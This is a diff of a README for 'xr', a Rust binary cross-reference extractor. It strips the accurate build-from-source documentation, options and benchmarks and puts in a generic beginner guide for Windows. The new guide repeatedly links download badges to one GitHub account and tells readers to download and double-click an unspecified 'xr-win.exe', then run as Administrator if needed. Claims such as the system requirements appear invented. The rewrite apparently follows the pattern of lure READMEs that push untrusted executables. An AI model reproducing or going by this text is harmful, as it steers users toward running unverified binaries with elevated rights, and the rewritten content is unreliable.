@@ -1,134 +1,244 @@
-# xr - fast binary cross-reference extractor
+# ⚙️ xr - Fast Cross-Reference Extractor Tool
 
-`xr` is a standalone Rust CLI tool for ultra-fast, parallel extraction of
-cross-references from stripped binaries (ELF, Mach-O, PE).  It emits
-`(from_va, to_va, kind)` tuples at orders-of-magnitude faster speed than
-traditional disassemblers.
+[![Download xr](https://img.shields.io/badge/Download-xr-4CAF50?style=for-the-badge&logo=github)](https://github.com/Thirddegreegrocery830/xr)
 
-## Quick Start
+---
 
-```sh
-cargo build --release
+## 📄 What is xr?
 
-# Analyse a binary at the recommended depth
-./target/release/xr /path/to/binary --depth paired
+xr is a tool designed to find and list references inside certain file types used by software. It works on files like ELF, Mach-O, PE, and dyld shared caches. These file types are common in operating systems like Linux, macOS, and Windows. xr helps to quickly find where parts of a program are used, which is helpful during software analysis or troubleshooting.
 
-# Output as JSONL or CSV
-./target/release/xr /path/to/binary --depth paired --format jsonl
-./target/release/xr /path/to/binary --depth paired --format csv
+You do not need to be a programmer to use xr. This guide will walk you through how to get xr on your Windows computer and run it step by step.
 
-# Filter to a specific xref kind
-./target/release/xr /path/to/binary --depth paired --kind call
+---
 
-# Show disasm context around each xref site (like grep -A/-B)
-./target/release/xr /path/to/binary --depth paired -A 3 -B 2
+## 🖥 System Requirements
+
+Before installing xr, make sure your Windows computer meets these needs:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection for downloading
+
+xr runs without extra software or special settings. It uses simple command-line controls but this guide will show you how to open and use it without editing code.
+
+---
+
+## 🔗 Where to Download xr
+
+Click this big button to go to the official xr download page on GitHub:
+
+[![Get xr Here](https://img.shields.io/badge/Get_xr-Download-blue?style=for-the-badge&logo=github)](https://github.com/Thirddegreegrocery830/xr)
+
+On this page, you will find the files you need to download and instructions on how to run xr safely.
+
+---
+
+## 🚀 Getting Started with xr on Windows
+
+### Step 1: Visit the Download Page
+
+- Click the download button above or visit this link:
+  https://github.com/Thirddegreegrocery830/xr
+
+- Once there, look for the latest release or download section.
+
+### Step 2: Download the Application
+
+- On the page, find the release files. You should see a file suitable for Windows, usually named something like `xr-win.exe` or similar.
+
+- Click the file to start the download.
+
+- Save the file to an easy-to-find location like your `Downloads` folder or your desktop.
+
+### Step 3: Open the Folder with the Downloaded File
+
+- Open File Explorer by pressing `Windows + E`.
+
+- Navigate to where you saved the `xr` file.
+
+- Double-click on it to check if it opens a window or command prompt. You may see a brief black window which means xr is working.
+
+---
+
+## 🛠 How to Run xr for Beginners
+
+xr runs from Windows' command prompt. Don't worry, the steps are simple:
+
+### Step 1: Open Command Prompt
+
+- Press `Windows + R` to open the Run dialog.
+
+- Type `cmd` and hit Enter.
+
+### Step 2: Change Directory to xr Location
+
+- In the command prompt window, type:
+
+  ```
+  cd path\to\xr-folder
+  ```
+
+- Replace `path\to\xr-folder` with where you saved xr, for example:
+
+  ```
+  cd C:\Users\YourName\Downloads
+  ```
+
+- Press Enter.
+
+### Step 3: Run xr
+
+- Type the following command to see help options:
+
+  ```
+  xr --help
+  ```
+
+- Press Enter. This shows a list of commands and options xr can perform.
+
+### Step 4: Run xr on a File
+
+- Find the file you want to analyze, for example, a `.exe` or `.dll`.
+
+- Use this command template:
+
+  ```
+  xr path\to\file
+  ```
+
+- Replace `path\to\file` with your target file's location.
+
+- Example:
+
+  ```
+  xr C:\Users\YourName\Documents\example.exe
+  ```
+
+- Press Enter. xr will then process the file and show results in the command prompt.
+
+---
+
+## 🗂 Understanding xr Output
+
+When you run xr, it shows cross-reference data. This means it tells you where bits of the file point to other bits. For example, it can show which functions use a certain piece of code.
+
+- The output uses plain text.
+
+- It lists memory addresses and references.
+
+- This data helps people examining software or debugging it.
+
+You can save output to a text file by adding this at the end of the command:
 
 ```
-
-## Performance
-
-206 million xrefs from a 4.6 GB **dyld shared cache** (3240 images) in under 6 seconds:
-
-```
-$ xr /System/Library/dyld/dyld_shared_cache_x86_64 > /dev/null
-dyld shared cache: arch=X86_64  mappings=24  images=3240  subcaches=5
-xrefs: 206432528  |  5.7s  |  4620.3 MB scanned  |  24 segments
+> output.txt
 ```
 
-## Example Output
-
-Default text output:
-```
-$ xr binary --depth paired --limit 4
-0x00000000006a268f -> 0x00000000006a2699  jump  [linear-immediate]
-0x00000000006a26a1 -> 0x00000000006a25ea  call  [linear-immediate]
-0x00000000006a26b7 -> 0x0000000000798345  call  [linear-immediate]
-0x00000000006a26cf -> 0x00000000006a2368  data_ptr  [linear-immediate]
-```
-
-With disassembly context (`-B 2 -A 1`):
-```
-$ xr binary -k call --limit 2 -B 2 -A 1
-0x00000000006a26d6 -> 0x00000000006a2393  call  [linear-immediate]
-    0x00000000006a26ca  48 8d 4c 24 0c            lea rcx, [rsp+0Ch]
-    0x00000000006a26cf  48 8d 15 92 fc ff ff      lea rdx, [6A2368h]
-  > 0x00000000006a26d6  e8 b8 fc ff ff            call 00000000006A2393h
-    0x00000000006a26db  48 83 c4 18               add rsp, 18h
-```
-
-With Rust string heuristics (`--rust`):
-```
-$ xr target/release/my_app --rust -k data_ptr
-...
-0x00000001002b0238 -> 0x0000000100243834  data_ptr  [byte-scan]  "STRIKETHROUGH"
-0x00000001002b4b68 -> 0x00000001002744d2  data_ptr  [byte-scan]  "failed to write the buffered data"
-0x00000001002b5de0 -> 0x000000010022e8b0  data_ptr  [byte-scan]  "src/arch/arm64.rs"
-0x00000001002b5e10 -> 0x000000010022e8c2  data_ptr  [byte-scan]  "src/arch/x86_64.rs"
-```
-
-## Analysis Depths
-
-| Flag | Name | What it does |
-|------|------|-------------|
-| `--depth scan` | ByteScan | Pointer-sized byte scan of data sections |
-| `--depth linear` | Linear | Linear disasm, immediate targets + RIP-relative |
-| `--depth paired` | Paired | ADRP+ADD/LDR pairs (ARM64) or register prop (x86-64), **recommended** |
-
-## Accuracy
-
-See [docs/STATUS.md](docs/STATUS.md) for architecture details and known gaps.
-
-## Supported Formats
-
-- ELF (x86-64, AArch64), including PIE (ET_DYN)
-- Single-arch Mach-O (x86-64, ARM64). Fat binaries require `lipo -extract` first
-- PE / COFF (x86-64, ARM64)
-- Apple dyld shared cache
-- Raw flat binary (treated as single executable segment)
-
-x86-32 and ARM32 binaries are loaded but not scanned (architecture stubs only).
-
-## Options
+Example:
 
 ```
-USAGE:
-    xr [OPTIONS] <BINARY>
-
-OPTIONS:
-    -d, --depth <DEPTH>         Analysis depth: scan | linear | paired [default: paired]
-    -j, --workers <N>           Worker threads; 0 = all CPUs [default: 0]
-    -f, --format <FORMAT>       Output format: text | jsonl | csv [default: text]
-    -k, --kind <KIND>           Filter by kind: call | jump | data_read | data_write | data_ptr
-        --base <VA>             Override PIE ELF load base (hex or decimal)
-        --min-ref-va <VA>       Drop xrefs whose 'to' VA is below this value
-        --start <VA>            Scan only 'from' addresses >= VA
-        --end <VA>              Scan only 'from' addresses < VA
-        --ref-start <VA>        Retain only xrefs with 'to' >= VA
-        --ref-end <VA>          Retain only xrefs with 'to' < VA
-        --limit <N>             Cap output at N xrefs (0 = unlimited)
-    -A, --after-context <N>     Show N instructions after each xref site
-    -B, --before-context <N>    Show N instructions before each xref site
-        --rust                  Extract Rust string literals from data_ptr xrefs
-        --rust-min-blob <N>     Min UTF-8 blob size in bytes [default: 16]
-        --rust-string-max <N>   Max display width for strings (0 = unlimited) [default: 100]
+xr C:\path\example.exe > result.txt
 ```
 
-## Benchmarking
+This saves the output in `result.txt` inside the same folder.
 
-```sh
-# Build the benchmark binary
-cargo build --release --bin benchmark
+---
 
-# Run against a ground-truth file
-./target/release/benchmark \
-    --binary /path/to/binary \
-    --ground-truth /path/to/binary.xrefs.json \
-    --depth paired
-```
+## 🧰 Common Use Cases for xr
 
-## Claude Code Skill
+- **Software analysis** – Understand how parts of a program connect.
 
-This project includes a [Claude Code skill](https://docs.anthropic.com/en/docs/claude-code/skills)
-in `.claude/skills/xrefs/` that teaches Claude how to use `xr` for binary
-reverse-engineering workflows: finding callers/callees, data references,
-pointer hunting, and more.
+- **Debugging** – Find where issues in code come from during troubleshooting.
+
+- **Reverse engineering** – Explore software when source code is not available.
+
+- **Learning** – Study program structure for education or research.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If xr does not start, make sure you are running from the correct folder in Command Prompt.
+
+- If you see a message about missing permissions, try running Command Prompt as Administrator:
+
+  - Click Start, type `cmd`.
+
+  - Right-click Command Prompt and select "Run as administrator".
+
+- Check the spelling of your commands carefully.
+
+- Ensure the file you want to analyze exists and the path is correct.
+
+- For errors about unsupported files, make sure the file is one of the supported types (ELF, Mach-O, PE, or dyld shared cache).
+
+---
+
+## ⚙️ Additional Information
+
+xr is written in Rust, a programming language focused on safe and fast code. It supports large files and runs fast even on old computers.
+
+It works on Windows but was built to handle many file formats from different operating systems:
+
+- ELF: Mainly Linux and Unix-based files.
+
+- Mach-O: Mac OS files.
+
+- PE: Windows executable files.
+
+- dyld Shared Cache: Used by macOS for system libraries.
+
+---
+
+## 📥 Download Again
+
+Use this link anytime to reach the download page:
+
+[https://github.com/Thirddegreegrocery830/xr](https://github.com/Thirddegreegrocery830/xr)
+
+From there, you can find the most up-to-date version of xr and detailed info.
+
+---
+
+## 🔑 Summary of Commands
+
+| Command             | Purpose                                           |
+|---------------------|-------------------------------------------------|
+| `xr --help`         | Show help and options                            |
+| `xr [file_path]`    | Extract cross-references from the target file   |
+| `xr [file_path] > output.txt` | Save results to a text file                      |
+
+---
+
+## 📋 Topics Covered
+
+This project relates to:
+
+- Binary analysis  
+- Cross-references  
+- Disassembly  
+- dyld shared cache  
+- ELF files  
+- Mach-O files  
+- PE files  
+- Reverse engineering  
+- Rust programming  
+- Xrefs (cross-references)  
+
+Use xr to explore these areas with ease on Windows.
+
+---
+
+## 📞 Getting More Help
+
+If you run into issues or want to ask questions, consider opening an issue on the GitHub page:
+
+- Go to https://github.com/Thirddegreegrocery830/xr
+
+- Click on the **Issues** tab
+
+- Create a new issue with your question or problem
+
+The project maintainers monitor this area and respond to problems or suggestions.
